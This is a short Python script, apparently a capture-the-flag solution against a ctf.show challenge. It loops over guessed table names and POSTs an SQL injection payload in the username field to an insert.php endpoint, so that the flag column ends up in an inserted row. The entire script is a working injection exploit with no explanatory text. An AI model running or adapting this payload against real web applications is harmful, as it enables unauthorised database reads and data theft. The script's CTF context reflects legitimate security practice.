import requests

url = "http://807d4bfb-e406-4b7d-ab68-5cd9df5cacd7.challenge.ctf.show/api/insert.php"
s = 'ab'
for i in s:
    for j in s:
        for k in s:
            for l in s:
                for m in s:
                    table = 'flag' + i + j + k + l + m
                    data = {'username': f"1',(select(flag)from({table})))#",
                            'password': '1'}
                    requests.post(url, data=data)
